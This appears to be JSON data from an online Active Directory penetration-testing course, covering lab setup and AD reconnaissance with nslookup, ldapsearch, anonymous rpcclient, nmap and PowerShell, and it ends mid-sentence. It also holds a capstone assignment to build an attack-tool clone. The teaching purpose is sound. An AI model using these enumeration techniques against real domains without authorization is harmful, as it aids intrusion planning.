Document all steps taken during the penetration test of your lab environment, from initial enumeration to domain compromise. Include detailed descriptions of the vulnerabilities exploited and the impact of each attack.  Provide actionable recommendations for remediation.</li>\n<li><strong>Capstone Project:</strong>  Develop your chosen attack tool clone.  Document the design, implementation, and testing of your tool.  Demonstrate its functionality in your lab environment.  Present your documentation and tool to the class (if applicable) or to a designated reviewer.</li>\n</ol>\n<hr>\n<p><strong>Grading Rubric (Example):</strong></p>\n<ul>\n<li><strong>Documentation (50%):</strong><ul>\n<li>Completeness:  Covers all phases of the penetration test (10%)</li>\n<li>Accuracy:  Provides accurate and verifiable information (10%)</li>\n<li>Clarity:  Uses clear and concise language (10%)</li>\n<li>Organization:  Logically structured and easy to follow (10%)</li>\n<li>Actionable Recommendations:  Provides specific and practical remediation steps (10%)</li>\n</ul>\n</li>\n<li><strong>Capstone Project (50%):</strong><ul>\n<li>Functionality:  Implements the core functionality of the chosen attack (20%)</li>\n<li>Code Quality:  Well-written, readable, and maintainable code (10%)</li>\n<li>Documentation:  Provides clear and comprehensive documentation (10%)</li>\n<li>Presentation:  Clearly explains the purpose and functionality of the tool (10%)</li>\n</ul>\n</li>\n</ul>\n<hr>\n<p>This is a comprehensive outline and guide for Module 8. Remember, the key is to <em>do</em> the work. Build your lab, run the commands, write the code, and document your findings. Good luck!  Let me know if you have any questions as you work through this.</p>\n\n                </div>\n             </div>\n         "
  },
  "sidebarOverview": "\n         <div class=\"card course-progress-card\">\n             <h3>Course Progress</h3>\n             <!-- Progress bar placeholder -->\n             <div class=\"progress-bar-container\">\n                 <div class=\"progress-bar\" style=\"width: 0%;\"></div>\n             </div>\n             <p>0% Complete</p>\n             <p>0/8 modules completed</p>\n             <button>Continue Learning</button>\n         </div>\n         <div class=\"card\">\n             <h3>What You'll Learn</h3>\n             <div class=\"markdown-content text-center\"> <p>Coming Soon</p>\n </div> <!-- Placeholder Coming Soon -->\n         </div>\n         <div class=\"card\">\n             <h3>Requirements</h3>\n              <div class=\"markdown-content text-center\"> <p>Coming Soon</p>\n </div> <!-- Placeholder Coming Soon -->\n         </div>\n     ",
  "rawModules": [
    {
      "title": "1: Active Directory Foundations & Lab Setup",
      "description": "1: Active Directory Foundations & Lab Setup Overview",
      "order": 1,
      "content": "**Module Objective:** Understand the core concepts of Active Directory and set up a fully functional, isolated lab environment for safe and ethical penetration testing.\r\n\r\n**Subtopics:**\r\n\r\n*   What is Active Directory? (Overview of purpose, history, and evolution)\r\n*   Key AD Components: Domains, Forests, Trees, Organizational Units (OUs)\r\n*   Domain Controllers: Roles, replication, and importance\r\n*   Trust Relationships: Understanding inter-domain communication\r\n*   Kerberos: The heart of AD authentication (brief overview, detailed analysis later)\r\n*   Windows Server: Installation, configuration, and basic management\r\n*   Windows Clients: Joining a domain, user profiles, and GPOs\r\n*   Lab Setup:\r\n    *   Virtualization environment setup (VMware/VirtualBox)\r\n    *   Windows Server installation and configuration as a Domain Controller\r\n    *   Windows Client installation and domain joining\r\n    *   Network isolation and security considerations (importance of a closed network)\r\n*   Basic PowerShell administration for AD.\r\n\r\n**Suggested Resources/Prerequisites:**\r\n\r\n*   Microsoft's official Active Directory documentation\r\n*   \"Active Directory Administration Cookbook\" (resource for server configuration)\r\n*   Basic virtualization tutorials for your chosen platform.\r\n\r\n**Module Project:** Build your Active Directory lab. Document the steps you took to install and configure the Domain Controller and Client machines. Include screenshots and justifications for your configuration choices. This will be a living document that you'll add to throughout the course.\r\n\r\n---\r\n\r\n### 1.1 What is Active Directory?\r\n\r\nActive Directory (AD) is Microsoft's directory service implementation for Windows domain networks.  Think of it as a centralized database that manages users, computers, groups, and other objects within a network.  It's the backbone of many enterprise IT infrastructures, providing:\r\n\r\n*   **Centralized Authentication:**  Users authenticate once to the domain, rather than needing separate logins for each resource.\r\n*   **Centralized Authorization:**  AD controls access to network resources based on user identity and group membership.\r\n*   **Centralized Management:**  Administrators can manage users, computers, and security policies from a single location.\r\n*   **Policy Enforcement:** Group Policy Objects (GPOs) allow administrators to enforce security settings and configurations across the network.\r\n\r\n**History and Evolution:**\r\n\r\nAD was introduced with Windows 2000 Server and has evolved significantly since then.  Early versions focused primarily on user and computer management.  Later versions added features like:\r\n\r\n*   **Group Policy:**  Enabling centralized configuration management.\r\n*   **Active Directory Federation Services (ADFS):**  Supporting single sign-on (SSO) across different organizations.\r\n*   **Active Directory Certificate Services (AD CS):**  Providing certificate-based authentication and encryption.\r\n*   **Azure Active Directory (Azure AD):**  Microsoft's cloud-based identity and access management service (distinct from on-premise AD, but often integrated).\r\n\r\n### 1.2 Key AD Components\r\n\r\nUnderstanding these components is crucial for navigating and attacking Active Directory.\r\n\r\n*   **Domains:**  A logical grouping of network objects (users, computers, groups) that share a common directory database and security policies.  Your lab will be a single domain.\r\n*   **Forests:**  A collection of one or more domains that trust each other.  The first domain created in a forest is called the forest root domain.\r\n*   **Trees:**  A hierarchical collection of domains that share a contiguous DNS namespace.  Domains within a tree trust each other transitively.\r\n*   **Organizational Units (OUs):**  Containers within a domain that allow you to organize users, computers, and groups.  OUs are used to delegate administrative control and apply specific GPOs.\r\n\r\n**Analogy:**\r\n\r\nThink of a forest as a country.  Each tree is a state within that country, and each domain is a city within the state. OUs are neighborhoods within a city.\r\n\r\n### 1.3 Domain Controllers\r\n\r\nDomain Controllers (DCs) are the servers that hold the Active Directory database and are responsible for authenticating users and enforcing security policies.\r\n\r\n*   **Roles:**\r\n    *   **Primary Domain Controller (PDC) Emulator:**  Handles password changes, time synchronization, and other critical operations.  In a single-domain environment, one DC holds this role.\r\n    *   **RID Master:**  Allocates blocks of Relative IDs (RIDs) to DCs for creating new objects.\r\n    *   **Infrastructure Master:**  Responsible for updating cross-domain group memberships.\r\n    *   **Schema Master:**  Controls updates to the Active Directory schema (the definition of object types and attributes).\r\n    *   **Domain Naming Master:**  Manages the addition and removal of domains within a forest.\r\n*   **Replication:** DCs replicate changes to the Active Directory database to each other, ensuring consistency.  Replication is critical for availability and fault tolerance.\r\n*   **Importance:**  Compromising a Domain Controller is typically the ultimate goal of an Active Directory penetration test, as it grants full control of the domain.\r\n\r\n### 1.4 Trust Relationships\r\n\r\nTrust relationships allow users in one domain to access resources in another domain.  Understanding trust relationships is important for lateral movement in multi-domain environments.\r\n\r\n*   **Types:**\r\n    *   **Parent-Child Trust:**  Automatically created between a parent domain and a child domain in a tree.\r\n    *   **Forest Trust:**  Trust between two entire forests.\r\n    *   **External Trust:**  Trust between an Active Directory domain and a domain running a different directory service (e.g., a Windows NT 4.0 domain).\r\n    *   **Realm Trust:** Trust between an Active Directory domain and a Kerberos realm (often used with Linux/Unix systems).\r\n*   **Direction:**  Trusts can be one-way or two-way.\r\n*   **Transitivity:**  Trusts can be transitive (trust flows through multiple domains) or non-transitive.\r\n\r\n### 1.5 Kerberos: The Heart of AD Authentication\r\n\r\nKerberos is the primary authentication protocol used in Active Directory. We'll delve into it much deeper later, but for now, a basic understanding is essential.\r\n\r\n*   **How it Works (Simplified):**\r\n    1.  A client requests a Ticket Granting Ticket (TGT) from the Key Distribution Center (KDC) ‚Äì which runs on the Domain Controller ‚Äì by proving their identity (usually with a password).\r\n    2.  The KDC issues a TGT, encrypted with the KDC's secret key.\r\n    3.  The client presents the TGT to the KDC to request a service ticket for a specific service (e.g., accessing a file share).\r\n    4.  The KDC issues a service ticket, encrypted with the service's secret key.\r\n    5.  The client presents the service ticket to the service to gain access.\r\n*   **Key Concepts:**\r\n    *   **Principal:**  A unique identifier for a user, computer, or service.\r\n    *   **Key Distribution Center (KDC):**  The central authority for Kerberos authentication (runs on the Domain Controller).\r\n    *   **Ticket Granting Ticket (TGT):**  A ticket that allows a client to request service tickets.\r\n    *   **Service Ticket:**  A ticket that allows a client to access a specific service.\r\n\r\n### 1.6 Windows Server: Installation, Configuration, and Basic Management\r\n\r\nWe'll be using Windows Server as our Domain Controller.  Let's cover the basics.\r\n\r\n*   **Installation:**  Download an ISO image of Windows Server (evaluation versions are available from Microsoft).  Create a new virtual machine in VMware or VirtualBox and boot from the ISO image.  Follow the installation prompts.  Choose the \"Server with Desktop Experience\" option for a graphical interface.\r\n*   **Configuration:**\r\n    *   **Static IP Address:**  Assign a static IP address to your server.  This is crucial for DNS resolution and reliable communication.  Go to Network and Sharing Center -> Change adapter settings -> Right-click your network adapter -> Properties -> Internet Protocol Version 4 (TCP/IPv4) -> Properties.  Enter a static IP address, subnet mask, default gateway, and preferred DNS server.  **Important:** The preferred DNS server *must* be the IP address of your Domain Controller (itself!).\r\n    *   **Computer Name:**  Set a descriptive computer name (e.g., `DC01`).  Right-click \"This PC\" -> Properties -> Change settings -> Change.\r\n    *   **Windows Updates:**  Install the latest Windows updates.\r\n\r\n### 1.7 Windows Clients: Joining a Domain, User Profiles, and GPOs\r\n\r\nWe'll also need a Windows client machine to simulate a typical user workstation.\r\n\r\n*   **Installation:**  Download an ISO image of Windows (Windows 10 or 11 is fine).  Create a new virtual machine and boot from the ISO image.  Follow the installation prompts.\r\n*   **Joining a Domain:**\r\n    1.  Assign the client machine a static IP address on the same network as the Domain Controller.  Make sure the client's DNS server is set to the IP address of the Domain Controller.\r\n    2.  Right-click \"This PC\" -> Properties -> Change settings -> Change.\r\n    3.  Select \"Domain\" and enter the name of your domain (e.g., `example.local`).\r\n    4.  You'll be prompted for domain administrator credentials.  Enter the credentials you created during the Domain Controller setup.\r\n    5.  Restart the client machine.\r\n*   **User Profiles:**  When a user logs in to the domain for the first time, a user profile is created.  This profile stores the user's settings, documents, and other data.\r\n*   **Group Policy Objects (GPOs):**  GPOs are used to configure settings for users and computers in the domain.  We'll explore GPOs in more detail later.\r\n\r\n### 1.8 Lab Setup: Virtualization, Domain Controller, Client, and Network Isolation\r\n\r\nThis is the most important part of this module.  A properly configured lab is essential for safe and effective penetration testing.\r\n\r\n*   **Virtualization Environment:**\r\n    *   **VMware Workstation/Player or VirtualBox:** Choose your preferred virtualization platform.  Both are excellent choices.  VMware Workstation offers more advanced features, but VMware Player and VirtualBox are free for personal use.\r\n    *   **Resource Allocation:**  Allocate sufficient resources to your virtual machines.  A Domain Controller typically needs at least 4 GB of RAM and 2 virtual CPUs.  A client machine needs at least 2 GB of RAM and 1 virtual CPU.  Adjust these values based on your hardware and the demands of your testing.\r\n*   **Windows Server Installation and Configuration as a Domain Controller:**\r\n    1.  **Install Windows Server (as described above).**\r\n    2.  **Promote the Server to a Domain Controller:**\r\n        *   Open Server Manager.\r\n        *   Click \"Add roles and features.\"\r\n        *   Select \"Active Directory Domain Services\" and follow the prompts.\r\n        *   Choose \"Add a new forest.\"\r\n        *   Enter a root domain name (e.g., `example.local`).  **Choose a domain name you will remember and use consistently.**\r\n        *   Set a strong Directory Services Restore Mode (DSRM) password. **IMPORTANT: Write this down and store it securely.  You'll need it to restore AD in case of disaster.**\r\n        *   Accept the default settings for the remaining options.\r\n        *   The server will restart after the installation is complete.  This process can take some time.\r\n*   **Windows Client Installation and Domain Joining (as described above).**\r\n*   **Network Isolation and Security Considerations:**  **This is paramount!**\r\n    *   **Internal Network:**  Create an internal network within your virtualization environment.  This network should *not* have access to the internet or your host machine's network.  This prevents your testing activities from affecting your real network or other systems.\r\n        *   **VMware:**  Use a \"Host-only\" network adapter for your virtual machines.  This creates a private network between the VMs and a virtual adapter on your host machine. The host adapter should *not* be connected to the internet or your main network.\r\n        *   **VirtualBox:**  Use an \"Internal Network\" adapter for your virtual machines.  This creates a private network that is isolated from the host machine and the internet.\r\n    *   **Firewall:**  Configure the Windows Firewall on both the Domain Controller and the client machine.  For testing purposes, you can disable the firewall entirely, but in a real-world environment, you would need to configure specific firewall rules to allow necessary traffic.\r\n    *   **Antivirus:**  Consider disabling antivirus software on your virtual machines during testing.  Antivirus software can interfere with penetration testing tools and techniques.  **However, be extremely careful when downloading and running potentially malicious files.** Only do this in your isolated lab environment.\r\n\r\n### 1.9 Basic PowerShell Administration for AD\r\n\r\nPowerShell is a powerful tool for managing Active Directory.  Let's look at some basic cmdlets.\r\n\r\n*   **Import the Active Directory Module:**  Before you can use AD cmdlets, you need to import the Active Directory module.\r\n    ```powershell\r\n    Import-Module ActiveDirectory\r\n    ```\r\n\r\n*   **Get-ADUser:**  Retrieves user accounts.\r\n    ```powershell\r\n    # Get all user accounts\r\n    Get-ADUser -Filter *\r\n\r\n    # Get a specific user account\r\n    Get-ADUser -Identity \"username\"\r\n\r\n    # Get a user account and select specific properties\r\n    Get-ADUser -Identity \"username\" -Properties SamAccountName, DisplayName, EmailAddress\r\n    ```\r\n\r\n*   **Get-ADGroup:**  Retrieves group accounts.\r\n    ```powershell\r\n    # Get all group accounts\r\n    Get-ADGroup -Filter *\r\n\r\n    # Get a specific group account\r\n    Get-ADGroup -Identity \"groupname\"\r\n    ```\r\n\r\n*   **Get-ADComputer:**  Retrieves computer accounts.\r\n    ```powershell\r\n    # Get all computer accounts\r\n    Get-ADComputer -Filter *\r\n\r\n    # Get a specific computer account\r\n    Get-ADComputer -Identity \"computername\"\r\n    ```\r\n\r\n*   **Get-ADObject:**  A generic cmdlet for retrieving any Active Directory object.\r\n    ```powershell\r\n    # Get an organizational unit\r\n    Get-ADObject -Identity \"OU=MyOU,DC=example,DC=local\"\r\n    ```\r\n\r\n*   **Example: Finding all users in a specific OU:**\r\n    ```powershell\r\n    Get-ADUser -Filter * -SearchBase \"OU=MyOU,DC=example,DC=local\"\r\n    ```\r\n\r\nThese are just a few basic examples.  PowerShell provides a vast array of cmdlets for managing Active Directory.  We'll explore more advanced PowerShell techniques in later modules.\r\n\r\n---\r\n\r\n**Module 1 Project: Build Your Active Directory Lab**\r\n\r\n1.  **Virtualization Setup:** Install VMware Workstation/Player or VirtualBox and create a new virtual machine for your Domain Controller and client.\r\n2.  **Windows Server Installation:** Install Windows Server on the Domain Controller VM.\r\n3.  **Domain Controller Configuration:** Configure a static IP address, computer name, and promote the server to a Domain Controller using the Active Directory Domain Services role.  **Remember the DSRM password!**\r\n4.  **Windows Client Installation:** Install Windows on the client VM.\r\n5.  **Domain Joining:** Join the client machine to the domain.\r\n6.  **Network Isolation:** Configure an internal network (Host-only in VMware, Internal Network in VirtualBox) to isolate your lab environment.\r\n7.  **PowerShell Exploration:**  Run the example PowerShell commands to explore your Active Directory environment.\r\n8.  **Documentation:** Create a document (e.g., a Word document or a Markdown file) and document each step of the lab setup process. Include screenshots and justifications for your configuration choices.  For example:\r\n    *   \"I chose a Host-only network in VMware because I want to completely isolate my lab environment from the internet and my host machine's network.\"\r\n    *   \"I set a static IP address of 192.168.10.10 for the Domain Controller because a static IP is required for DNS resolution.\"\r\n    *   \"I used the domain name `example.local` because it's a simple and easy-to-remember domain name.\"\r\n    *   Include screenshots of the network adapter settings, the domain joining process, and the output of the PowerShell commands.\r\n\r\n**This documentation will be a living document that you'll add to throughout the course.  The more detailed and thorough your documentation, the better you'll understand the concepts and the easier it will be to troubleshoot any issues.**\r\n\r\n**Troubleshooting Tips:**\r\n\r\n*   **DNS Resolution:**  The most common problem during lab setup is DNS resolution.  Make sure that the client machine's DNS server is set to the IP address of the Domain Controller.  Use the `nslookup` command to verify that the client can resolve the domain name.\r\n*   **Firewall:**  The Windows Firewall can block communication between the Domain Controller and the client machine.  For testing purposes, you can disable the firewall, but in a real-world environment, you would need to configure specific firewall rules.\r\n*   **Network Connectivity:**  Make sure that the Domain Controller and the client machine are on the same network and can ping each other.\r\n*   **Event Logs:**  Check the Windows Event Logs for error messages.  The Event Logs can provide valuable clues about the cause of problems.\r\n\r\nGood luck setting up your lab!  This is a crucial first step in your Active Directory penetration testing journey.  Don't be afraid to experiment and break things (within the safety of your isolated lab environment, of course!).  The more you experiment, the more you'll learn.  And remember, Google is your friend!"
    },
    {
      "title": "module_2",
      "description": "module_2 Overview",
      "order": 2,
      "content": "Alright, let's dive into Module 2: Active Directory Enumeration - The Reconnaissance Phase. This module is the bedrock of any successful Active Directory penetration test. You can have the best exploits in the world, but if you don't know *where* to point them, you're dead in the water. We're going to learn how to gather intelligence like seasoned spies, uncovering the secrets of the AD environment.\r\n\r\n---\r\n\r\n**Module 2: Active Directory Enumeration - The Reconnaissance Phase**\r\n\r\n*   **Module Objective:** Learn and apply various techniques to gather information about the Active Directory environment, identifying potential targets and vulnerabilities.\r\n\r\n---\r\n\r\n**2.1: The Importance of Enumeration: Why it's the foundation of a successful attack**\r\n\r\nImagine trying to navigate a city without a map. You'd be wandering aimlessly, hoping to stumble upon your destination. That's what attacking Active Directory without proper enumeration is like. Enumeration provides the *map* of the AD environment. It allows you to:\r\n\r\n*   **Identify Targets:** Discover user accounts, groups, computers, and services that are vulnerable or misconfigured.\r\n*   **Map Relationships:** Understand how users, groups, and computers are connected, revealing potential attack paths.\r\n*   **Uncover Vulnerabilities:** Identify weaknesses in the AD configuration, such as weak passwords, unpatched systems, or misconfigured permissions.\r\n*   **Prioritize Attacks:** Focus your efforts on the most promising targets and attack vectors.\r\n*   **Avoid Detection:** By understanding the environment, you can tailor your attacks to be less noisy and more likely to succeed.\r\n\r\nWithout thorough enumeration, you're essentially throwing darts in the dark. You might get lucky, but you're far more likely to fail and get caught.\r\n\r\n**2.2: Basic Enumeration Techniques**\r\n\r\nBefore we jump into the more specialized tools, let's cover some fundamental networking techniques that can provide valuable initial information.\r\n\r\n*   **2.2.1: `nslookup` and `dig` for DNS information gathering.**\r\n\r\n    DNS is the phonebook of the internet (and your internal network). It translates human-readable domain names into IP addresses. Enumerating DNS can reveal important information about the AD environment, such as:\r\n\r\n    *   Domain controllers: Their names and IP addresses.\r\n    *   Service records (SRV records): Identifying Kerberos servers, LDAP servers, and other critical services.\r\n    *   Hostnames: Discovering the names of computers on the network.\r\n\r\n    **`nslookup` Example:**\r\n\r\n    ```bash\r\n    nslookup -type=SRV _kerberos._tcp.yourdomain.local\r\n    ```\r\n\r\n    Replace `yourdomain.local` with your lab domain. This query will return the SRV records for Kerberos, revealing the domain controllers.\r\n\r\n    **`dig` Example:**\r\n\r\n    ```bash\r\n    dig SRV _kerberos._tcp.yourdomain.local\r\n    ```\r\n\r\n    `dig` offers more detailed output than `nslookup`.  It's generally preferred by security professionals.\r\n\r\n    **Interpreting the Results:**\r\n\r\n    The output will show you the hostname and port number of your domain controllers.  For example:\r\n\r\n    ```\r\n    _kerberos._tcp.yourdomain.local. 600 IN SRV 0 100 88 dc01.yourdomain.local.\r\n    _kerberos._tcp.yourdomain.local. 600 IN SRV 0 100 88 dc02.yourdomain.local.\r\n    ```\r\n\r\n    This tells you that `dc01.yourdomain.local` and `dc02.yourdomain.local` are domain controllers for the `yourdomain.local` domain, and they are listening on port 88 (the standard Kerberos port).\r\n\r\n    **Why is this important?** Knowing the domain controllers is crucial for later attacks, as these are the most sensitive targets.\r\n\r\n*   **2.2.2: `ping` and `traceroute` for network discovery.**\r\n\r\n    These tools are used to test network connectivity and map the network topology.\r\n\r\n    **`ping` Example:**\r\n\r\n    ```bash\r\n    ping dc01.yourdomain.local\r\n    ```\r\n\r\n    This will send ICMP echo requests to the domain controller. If you receive a response, it means the domain controller is reachable.\r\n\r\n    **`traceroute` Example:**\r\n\r\n    ```bash\r\n    traceroute dc01.yourdomain.local\r\n    ```\r\n\r\n    This will show you the path that packets take to reach the domain controller, revealing the network infrastructure.\r\n\r\n    **Why is this important?**  `ping` confirms reachability, while `traceroute` can help you understand the network layout and identify potential bottlenecks or security devices.  However, be aware that ICMP traffic is often blocked by firewalls.\r\n\r\n**2.3: LDAP Enumeration**\r\n\r\nLDAP (Lightweight Directory Access Protocol) is the protocol used to access and modify directory information in Active Directory. Enumerating LDAP is a goldmine for information gathering.\r\n\r\n*   **2.3.1: `ldapsearch`: Understanding LDAP queries and syntax. Searching for users, groups, computers, and OUs.**\r\n\r\n    `ldapsearch` is a command-line tool for querying LDAP directories. It's incredibly powerful for gathering information about the AD environment.\r\n\r\n    **Basic Syntax:**\r\n\r\n    ```bash\r\n    ldapsearch -x -h <server> -b <base_dn> <filter> <attributes>\r\n    ```\r\n\r\n    *   `-x`:  Use simple authentication (no SASL).\r\n    *   `-h <server>`:  The LDAP server to connect to (e.g., `dc01.yourdomain.local`).\r\n    *   `-b <base_dn>`:  The base distinguished name (DN) to search from (e.g., `dc=yourdomain,dc=local`).  This defines the starting point for the search. You can usually find this in the output of a DNS SRV record lookup.\r\n    *   `<filter>`:  The search filter (e.g., `(objectClass=user)`).\r\n    *   `<attributes>`:  The attributes to retrieve (e.g., `sAMAccountName,displayName,userPrincipalName`). If omitted, all attributes are returned.\r\n\r\n    **Examples:**\r\n\r\n    *   **List all users:**\r\n\r\n        ```bash\r\n        ldapsearch -x -h dc01.yourdomain.local -b dc=yourdomain,dc=local \"(objectClass=user)\" sAMAccountName displayName userPrincipalName\r\n        ```\r\n\r\n    *   **List all groups:**\r\n\r\n        ```bash\r\n        ldapsearch -x -h dc01.yourdomain.local -b dc=yourdomain,dc=local \"(objectClass=group)\" sAMAccountName displayName\r\n        ```\r\n\r\n    *   **List all computers:**\r\n\r\n        ```bash\r\n        ldapsearch -x -h dc01.yourdomain.local -b dc=yourdomain,dc=local \"(objectClass=computer)\" sAMAccountName dNSHostName operatingSystem\r\n        ```\r\n\r\n    *   **List all Organizational Units (OUs):**\r\n\r\n         ```bash\r\n         ldapsearch -x -h dc01.yourdomain.local -b dc=yourdomain,dc=local \"(objectClass=organizationalUnit)\" name distinguishedName\r\n         ```\r\n\r\n    **Interpreting the Results:**\r\n\r\n    The output will be a series of LDAP entries, each representing a user, group, computer, or OU.  Each entry will contain a list of attributes and their values.\r\n\r\n    **Why is this important?**  `ldapsearch` allows you to gather a wealth of information about the AD environment, including user accounts, group memberships, computer names, and OU structure. This information is critical for identifying potential targets and planning your attack.\r\n\r\n*   **2.3.2: LDAP filters: Crafting complex queries to target specific information.**\r\n\r\n    LDAP filters allow you to refine your searches and retrieve only the information you need. Filters use a specific syntax based on boolean logic.\r\n\r\n    **Common Filter Operators:**\r\n\r\n    *   `=`:  Equals\r\n    *   `~=`:  Approximate match\r\n    *   `>=`:  Greater than or equal to\r\n    *   `<=`:  Less than or equal to\r\n    *   `*`:  Wildcard\r\n    *   `&`:  Logical AND\r\n    *   `|`:  Logical OR\r\n    *   `!`:  Logical NOT\r\n\r\n    **Examples:**\r\n\r\n    *   **Find all users with a specific email address:**\r\n\r\n        ```bash\r\n        ldapsearch -x -h dc01.yourdomain.local -b dc=yourdomain,dc=local \"(mail=testuser@yourdomain.local)\" sAMAccountName displayName userPrincipalName\r\n        ```\r\n\r\n    *   **Find all users whose display name starts with \"Admin\":**\r\n\r\n        ```bash\r\n        ldapsearch -x -h dc01.yourdomain.local -b dc=yourdomain,dc=local \"(displayName=Admin*)\" sAMAccountName displayName userPrincipalName\r\n        ```\r\n\r\n    *   **Find all users who are members of the \"Domain Admins\" group:**\r\n\r\n        This is a bit more complex, requiring you to know the distinguished name of the \"Domain Admins\" group.  First, find the DN:\r\n\r\n        ```bash\r\n        ldapsearch -x -h dc01.yourdomain.local -b dc=yourdomain,dc=local \"(sAMAccountName=Domain Admins)\" distinguishedName\r\n        ```\r\n\r\n        Let's say the distinguished name is `CN=Domain Admins,CN=Users,DC=yourdomain,DC=local`.  Then the query would be:\r\n\r\n        ```bash\r\n        ldapsearch -x -h dc01.yourdomain.local -b dc=yourdomain,dc=local \"(memberOf=CN=Domain Admins,CN=Users,DC=yourdomain,DC=local)\" sAMAccountName displayName userPrincipalName\r\n        ```\r\n\r\n    **Why is this important?**  Complex LDAP filters allow you to target specific information, such as users with specific roles, computers with specific software installed, or groups with specific permissions. This is crucial for identifying high-value targets and potential attack vectors.\r\n\r\n*   **2.3.3: Anonymous vs. Authenticated LDAP enumeration.**\r\n\r\n    By default, `ldapsearch` attempts to connect anonymously. However, you can also provide credentials to authenticate to the LDAP server.\r\n\r\n    **Anonymous Enumeration:**\r\n\r\n    The examples above all used anonymous enumeration (the `-x` flag disables SASL authentication, which is what would prompt for credentials).  This is often possible, but it provides limited information.\r\n\r\n    **Authenticated Enumeration:**\r\n\r\n    To authenticate, you can use the `-D` and `-W` flags to specify the bind DN and password:\r\n\r\n    ```bash\r\n    ldapsearch -x -h dc01.yourdomain.local -b dc=yourdomain,dc=local -D \"CN=testuser,CN=Users,DC=yourdomain,DC=local\" -W \"(objectClass=user)\" sAMAccountName displayName userPrincipalName\r\n    ```\r\n\r\n    This will prompt you for the password of the user `testuser`.\r\n\r\n    **Why is this important?**  Authenticated enumeration provides significantly more information than anonymous enumeration.  Once you have compromised a single user account, you can use its credentials to gather more detailed information about the AD environment.  This is a key step in lateral movement.\r\n\r\n**2.4: RPC Enumeration**\r\n\r\nRPC (Remote Procedure Call) is a protocol that allows programs on different computers to communicate with each other. Enumerating RPC services can reveal valuable information about the AD environment, such as open ports, shared resources, and running services.\r\n\r\n*   **2.4.1: `rpcclient`: Exploring RPC services and shares.**\r\n\r\n    `rpcclient` is a command-line tool for interacting with RPC services.  It's part of the Samba suite.\r\n\r\n    **Basic Syntax:**\r\n\r\n    ```bash\r\n    rpcclient -U \"\" -N <server>\r\n    ```\r\n\r\n    *   `-U \"\"`:  Use an empty username.\r\n    *   `-N`:  Suppress password prompt.\r\n    *   `<server>`:  The server to connect to (e.g., `dc01.yourdomain.local`).\r\n\r\n    **Common Commands within `rpcclient`:**\r\n\r\n    *   `enumdomusers`:  List domain users.\r\n    *   `enumdomgroups`:  List domain groups.\r\n    *   `srvinfo`:  Get server information.\r\n    *   `netshareenum`:  List network shares.\r\n\r\n    **Examples:**\r\n\r\n    ```bash\r\n    rpcclient -U \"\" -N dc01.yourdomain.local\r\n    ```\r\n\r\n    Once connected, you can run commands:\r\n\r\n    ```\r\n    rpcclient $> enumdomusers\r\n    rpcclient $> netshareenum\r\n    ```\r\n\r\n    **Interpreting the Results:**\r\n\r\n    The output will show you a list of users, groups, or shares. Pay attention to any shares that are accessible to everyone or that contain sensitive data.\r\n\r\n    **Why is this important?**  `rpcclient` can reveal valuable information about the AD environment, such as user accounts, group memberships, and network shares.  This can help you identify potential targets for credential theft or data exfiltration.\r\n\r\n*   **2.4.2: Identifying open ports and services.**\r\n\r\n    Use `nmap` to scan for open ports and services on the domain controllers.\r\n\r\n    **Example:**\r\n\r\n    ```bash\r\n    nmap -sV -p 1-65535 dc01.yourdomain.local\r\n    ```\r\n\r\n    *   `-sV`:  Service version detection.\r\n    *   `-p 1-65535`:  Scan all ports.\r\n\r\n    **Interpreting the Results:**\r\n\r\n    The output will show you a list of open ports and the services running on those ports.  Pay attention to any unusual or unexpected services, as these could be vulnerable to exploitation.  Common ports to look for include:\r\n\r\n    *   135: RPC Endpoint Mapper\r\n    *   139: NetBIOS Session Service\r\n    *   445: SMB\r\n    *   3389: RDP (Remote Desktop Protocol)\r\n    *   5985: WinRM (Windows Remote Management)\r\n\r\n*   **2.4.3: Gathering NetBIOS information.**\r\n\r\n    NetBIOS (Network Basic Input/Output System) is an older protocol that is still used by some Windows systems.  You can use `nbtscan` to gather NetBIOS information.  Note: `nbtscan` may need to be installed separately.\r\n\r\n    **Example:**\r\n\r\n    ```bash\r\n    nbtscan 192.168.1.0/24\r\n    ```\r\n\r\n    Replace `192.168.1.0/24` with your lab network range.\r\n\r\n    **Interpreting the Results:**\r\n\r\n    The output will show you the NetBIOS names of computers on the network, as well as their MAC addresses.  This can help you identify potential targets for lateral movement.\r\n\r\n    **Why is this important?**  Identifying open ports and services allows you to focus your efforts on vulnerable systems.  NetBIOS information can provide additional clues about the network environment.\r\n\r\n**2.5: PowerShell Enumeration**\r\n\r\nPowerShell is a powerful scripting language that is built into Windows. It provides a rich set of cmdlets for managing Active Directory. You can use PowerShell to enumerate the AD environment from a compromised Windows machine.\r\n\r\n*   **2.5.1: `Get-ADUser`, `Get-ADGroup`, `Get-ADComputer` cmdlets.**\r\n\r\n    These cmdlets allow you to retrieve information about users, groups, and computers in the AD environment.\r\n\r\n    **Examples:**\r\n\r\n    ```powershell\r\n    # Get all users\r\n    Get-ADUser -Filter * -Properties * | Select-Object SamAccountName, DisplayName, UserPrincipalName | Export-Csv -Path users.csv\r\n\r\n    # Get all groups\r\n    Get-ADGroup -Filter * -Properties * | Select-Object SamAccountName, Name, GroupCategory | Export-Csv -Path groups.csv\r\n\r\n    # Get all computers\r\n    Get-ADComputer -Filter * -Properties * | Select-Object Name, OperatingSystem, IPv4Address | Export-Csv -Path computers.csv\r\n    ```\r\n\r\n    **Interpreting the Results:**\r\n\r\n    The output will be a list of users, groups, or computers, along with their attributes.  You can use the `Select-Object` cmdlet to specify which attributes to retrieve.  The `Export-Csv` cmdlet saves the output to a CSV file, which can be easily analyzed.\r\n\r\n    **Why is this important?**  PowerShell provides a powerful and flexible way to enumerate the AD environment from a compromised Windows machine.  The ability to export the data to a CSV file makes it easy to analyze and search for specific information.\r\n\r\n*   **2.5.2: Enumerating Group Policy Objects (GPOs).**\r\n\r\n    GPOs are used to manage the configuration of Windows systems. Enumerating GPOs can reveal valuable information about the security policies in place, as well as potential vulnerabilities.\r\n\r\n    **Example:**\r\n\r\n    ```powershell\r\n    Get-GPO -All | Select-Object DisplayName, Id | Export-Csv -Path gpos.csv\r\n    Get-GPOReport -All -ReportType HTML -Path gpo_reports.html\r\n    ```\r\n\r\n    The first command lists all GPOs and exports their display names and IDs to a CSV file. The second command generates HTML reports for each GPO, which can be analyzed for security vulnerabilities.  You'll need the `GroupPolicy` module installed for these to work. This usually comes with the RSAT tools.\r\n\r\n    **Why is this important?** GPOs can contain sensitive information, such as passwords, scripts, and configuration settings. Enumerating GPOs can reveal potential vulnerabilities that can be exploited to gain control of the AD environment. For example, a GPO might contain a script that runs with elevated privileges, or it might configure a system to allow remote access.\r\n\r\n*   **2.5.3: Discovering trust 